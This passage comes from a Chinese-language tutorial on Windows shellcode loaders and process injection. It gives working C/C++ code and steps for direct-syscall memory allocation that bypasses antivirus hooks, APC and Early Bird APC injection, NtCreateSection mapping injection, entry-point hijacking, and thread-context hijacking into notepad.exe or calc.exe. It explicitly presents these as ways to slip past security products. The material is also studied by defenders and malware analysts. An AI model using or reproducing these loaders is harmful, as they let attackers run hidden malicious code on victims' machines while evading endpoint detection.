hook获取软件运行时的具体参数和结果，因此可以捕捉软件运行的具体行为，这也是函数序列查杀的实现方式之一，但是可以通过重写ring3层的函数，直接调用系统内核的函数进行绕过，如此一来杀软下的hook并没有什么用，因为我们就没调用。尽管syscall的大部分都是一致的，但是其最核心的系统调用号在不同版本的机器上都不尽相同，因此只要解决了该核心问题，我们就可以重写ring3层需要的函数。
    pNtAllocateVirtualMemory fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub("NtAllocateVirtualMemory");
    LPVOID Memory = NULL;
    SIZE_T uSize = totalSize - sizeof(CONFIG);
    HANDLE hProcess = GetCurrentProcess();
    NTSTATUS status = fnNtAllocateVirtualMemory(hProcess, &Memory, 0, &uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (status != 0)
    {
        return 0;
    }
    memcpy(Memory, (unsigned char*)pBuffer + sizeof(CONFIG), totalSize - sizeof(CONFIG));
    StreamCrypt((unsigned char*)Memory, totalSize - sizeof(CONFIG), config.key, 128);
    //4.执行shellcode
    ((void(*)())Memory)();
本方式使用系统直接call分配内存然后加载shellcode，该方式不支持32位。
  1. 首先获取需要的函数NtAllocateVirtualMemory，其系统调用号在不同版本的机器上也不同，所以需要根据ntdll.dll动态获取其系统调用号。
  2. 然后使用当前进程的句柄分配内存。
  3. 执行shellcode。
### 注入类
#### APC注入
当系统创建一个线程的时候，会同时创建一个与线程相关的队列。这个队列被叫做异步过程调用(APC)队列。为了对线程中的APC队列中的项进行处理，线程必须
将自己设置为可提醒状态，只不过意味着我们的线程在执行的时候已经到达了一个点，在这个点上它能够处理被中断的情况，下边的六个函数能将线程设置为可提醒状态：SleepEx，WaitForSingleObjectEx，WaitForMultipleOBjectsEx，SingalObjectAndWait，GetQueuedCompletionStatusEx，MsgWaitForMultipleObjectsEx当我们调用上边的六个函数之一并将线程设置为可提醒状态的时候，系统首先会检查线程的APC队列，如果队列中至少有一项，那么系统就会开始执行APC队列中的对应的回调函数，然后清除该队列，等待返回。
本方式是经典的注入方式---APC注入。由于APC注入的限制，最好选择多线程的进程进行注入，本例选择了notepad.exe进行注入。
    for (DWORD threadId : threadIds) 
    {
        HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        Sleep(1000 * 2);
    }
  1. 首先获取当前进程和线程的快照
  2. 根据进程名获打开指定进程的句柄，并在其进程空间写入shellcode
  3. 将该进程的所有线程排入指向shellcode的APC
#### Early Brid APC注入
每个用户模式线程都在LdrInitializeThunk函数处开始执行，但是该函数有着如此的调用链：LdrInitializeThunk→LdrpInitialize→_LdrpInitialize→NtTestAlert→KiUserApcDispatcher，因此尽管有着APC注入的限制，但是shellcode依然能够在恢复线程的时候立马得到运行。由于它在线程初始化的非常早期阶段就加载了恶意代码，而随后许多安全产品都将其挂入钩子，这使恶意软件得以执行其恶意行为而不会被检测到。
    SIZE_T shellSize = totalSize - sizeof(CONFIG);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, buffer, shellSize, NULL);
    delete[] buffer;
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);
  1. 首先以挂起方式创建要注入的进程
  2. 获取创建的进程的进程句柄和主线程句柄
  3. 向其进程空间写入shellcode，并在主线程插入执行shellcode的APC
  4. 恢复主线程，shellcode得到执行
#### NtCreateSection注入
节是一种进程间的共享内存，可以使用NtCreateSection进行创建，进程在读写该共享内存钱，必须使用NtMapViewOfSection函数进行映射，多个进程可以通过映射的内存读写该节。
        SIZE_T size = shellcodeSize;
        LARGE_INTEGER sectionSize = { size };
        HANDLE sectionHandle = NULL;
        PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
        fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
        if (Process32First(snapshot, &processEntry))
        {
            while (_wcsicmp(processEntry.szExeFile, L"notepad.exe") != 0)
            {
                Process32Next(snapshot, &processEntry);
            }
        }
        DWORD targetPID = processEntry.th32ProcessID;
        HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID);
        fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
        memcpy(localSectionAddress, buffer, shellcodeSize);
        delete[] buffer;
        HANDLE targetThreadHandle = NULL;
        fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
  1. 首先通过NtCreateSection在本进程控件创建一个可读可写可执行的内存节。
  2. 将创建的节映射到本进程，权限为可读可写。
  3. 在目标进程也映射该节，权限为可读可执行即可。
  4. 将shellcode复制入本地映射的内存节,由于该节是共享的，因此目标进程中的该节也会是这串shellcode。
  5. 在目标进程中创建一个远程线程执行shellcode。
#### 入口点劫持注入
众所周知，PE中存在一个入口点，这个入口点正是进程开始执行的地方,所以我们可以通过更改内存中入口点的内容来运行我们的shellcode。由于存在ALSR，入口点还需要加上映像基址，所以我们可以找到内存中的入口点，再将其入口点的位置写入shellcode，即可获取进程的执行权限。
    STARTUPINFOA si;
    si = {};
    PROCESS_INFORMATION pi = {};
    PROCESS_BASIC_INFORMATION pbi = {};
    #ifdef _M_X64
        DWORD returnLength = 0;
        CreateProcessA(0, (LPSTR)"c:\\windows\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
        LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 16;
        LPVOID imageBase = 0;
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 8, NULL);
        BYTE headersBuffer[4096] = {};
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (LONGLONG)imageBase);
    #else
        DWORD returnLength = 0;
        CreateProcessA(0, (LPSTR)"c:\\windows\\system32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
        NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
        DWORD imageBaseOffset = (DWORD)pbi.PebBaseAddress + 8;
        LPVOID imageBase = 0;
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBaseOffset, &imageBase, 4, NULL);
        BYTE headersBuffer[4096] = {};
        ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
        LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase);
    #endif // x64
        WriteProcessMemory(pi.hProcess, codeEntry, buffer,shellcodeSize, NULL);
        delete[] buffer;
        ResumeThread(pi.hThread);
  1. 首先以挂起的形式创建要注入的进程。
  2. 从进程基本信息中获取映像基址。
  3. 从映像基址中读取PE头信息，再从NT头中获取入口点（该入口点也可以直接从文件中获取），加上获取的映像基址得到真的入口点。
  4. 再入口点写入shellcode，然后恢复线程即可开始执行shellcode。
#### 线程劫持注入
每个进程真正运行的其实是其中的多个线程，每个线程的EIP/RIP指针总是指向着当时的运行点，因此我们只要获取该运行点就相当于获取了线程的执行权限。
    SuspendThread(threadHijacked);
    GetThreadContext(threadHijacked, &context);
    #ifdef _M_X64
        context.Rip = (DWORD_PTR)remoteBuffer;
    #else
        context.Eip = (DWORD_PTR)remoteBuffer;
    #endif // x64
        SetThreadContext(threadHijacked, &context);
        ResumeThread(threadHijacked);
  1. 首先打开目标进程的进程句柄。
  2. 再目标进程的内存中写入shellcode。
  3. 然后获取目标进程的第一个线程的句柄并将其挂起。
  4. 修改线程的RIP/EIP指针指向shellcode。
  5. 然后恢复该线程开始执行shellcode。
## 6.参考
  * [windows shellcode开发基础](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#resources)
  * [CreateThreadpoolWait加载](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait)
  * [Fiber加载](https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber)
  * [NtTestAlert加载](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert)
  * [SEH异常加载](https://idiotc4t.com/code-and-dll-process-injection/seh-code-execute)
  * [TLS回调加载](https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute)
  * [系统call加载](https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/)
  * [APC注入](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)
  * [Early Bird APC注入](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
  * [Early Brid APC注入原理](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)
  * [NtCreateSection注入](https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection)
  * [入口点劫持注入](https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx)
  * [线程劫持注入](https://idiotc4t.com/code-and-dll-process-injection/setcontext-hijack-thread)
  * 《加密与解密4》
* * *